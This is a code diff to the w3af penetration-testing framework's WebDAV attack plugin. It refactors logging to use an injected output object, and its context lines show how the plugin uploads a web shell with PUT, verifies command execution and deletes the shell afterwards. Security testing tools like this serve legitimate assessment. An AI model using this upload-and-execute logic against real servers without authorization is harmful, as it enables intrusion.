@@ -20,7 +20,6 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
 
-import w3af.core.controllers.output_manager as om
 from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
 from w3af.core.data.fuzzer.utils import rand_alpha
 from w3af.core.data.parsers.doc.url import URL
@@ -70,7 +69,11 @@ class dav(AttackPlugin):
         if self._verify_vuln(vuln_obj):
             # Create the shell object
             shell_obj = DAVShell(
-                vuln_obj, self._uri_opener, self.worker_pool, self._exploit_url
+                vuln_obj,
+                self._uri_opener,
+                self.worker_pool,
+                self._exploit_url,
+                self._output,
             )
             return shell_obj
         else:
@@ -94,13 +97,13 @@ class dav(AttackPlugin):
         for file_content, real_extension in shell_list:
             if extension == "":
                 extension = real_extension
-            om.out.debug(f'Uploading shell with extension: "{extension}".')
+            self._output.debug(f'Uploading shell with extension: "{extension}".')
 
             # Upload the shell
             fname = f"{filename}.{extension}"
             url_to_upload = vuln_obj.get_url().url_join(fname)
 
-            om.out.debug(f"Uploading file {url_to_upload} using PUT method.")
+            self._output.debug(f"Uploading file {url_to_upload} using PUT method.")
             self._uri_opener.PUT(url_to_upload, data=file_content)
 
             # Verify if I can execute commands
@@ -116,7 +119,7 @@ class dav(AttackPlugin):
                     " verifies that the file was uploaded and is being"
                     " executed."
                 )
-                om.out.debug(msg)
+                self._output.debug(msg)
                 self._exploit_url = exploit_url
                 return True
             else:
@@ -126,7 +129,7 @@ class dav(AttackPlugin):
                     " not uploaded to the remote server or the code is not"
                     ' being run. The returned body was: "%s".'
                 )
-                om.out.debug(msg % (extension, response.get_body()))
+                self._output.debug(msg % (extension, response.get_body()))
                 extension = ""
 
     def get_root_probability(self):
@@ -155,10 +158,11 @@ class dav(AttackPlugin):
 
 class DAVShell(ExecShell):
 
-    def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
+    def __init__(self, vuln, uri_opener, worker_pool, exploit_url, output):
         super().__init__(vuln, uri_opener, worker_pool)
 
         self.exploit_url = exploit_url
+        self._output = output
 
     def execute(self, command):
         """
@@ -177,14 +181,14 @@ class DAVShell(ExecShell):
         url_to_del = self.exploit_url.uri2url()
 
         msg = "DAVShell is going to delete the web shell that was uploaded" " to %s."
-        om.out.debug(msg % url_to_del)
+        self._output.debug(msg % url_to_del)
 
         try:
             self._uri_opener.DELETE(url_to_del)
         except BaseFrameworkException as e:
-            om.out.error(f'DAVShell cleanup failed with exception: "{e}".')
+            self._output.error(f'DAVShell cleanup failed with exception: "{e}".')
         else:
-            om.out.debug(f"DAVShell cleanup complete, {url_to_del} deleted.")
+            self._output.debug(f"DAVShell cleanup complete, {url_to_del} deleted.")
 
     def get_name(self):
         return "dav"
@@ -194,4 +198,10 @@ class DAVShell(ExecShell):
         Need to define this method since the Shell class defines it, and we have
         a different number of __init__ parameters.
         """
-        return self.__class__, (self._vuln, None, None, self.exploit_url)
+        return self.__class__, (
+            self._vuln,
+            None,
+            None,
+            self.exploit_url,
+            self._output,
+        )
